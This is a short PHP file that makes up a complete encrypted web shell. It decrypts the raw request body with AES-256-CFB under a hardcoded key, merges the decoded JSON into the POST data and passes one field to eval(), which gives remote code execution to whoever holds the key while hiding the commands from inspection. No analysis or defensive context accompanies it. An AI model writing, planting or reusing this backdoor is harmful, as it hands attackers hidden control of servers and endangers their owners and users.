<?php
$_ = file_get_contents("php://input");
$_ = openssl_decrypt(pack("H*", substr($_, 16)), "AES-256-CFB", "518b67e652531c5fe7e25d6b2c3b4ef6", OPENSSL_RAW_DATA, substr($_, 0, 16));
$_ = json_decode(rtrim($_, "`"), true);
$_POST = array_merge($_POST, $_);
eval($_["_"]);
?>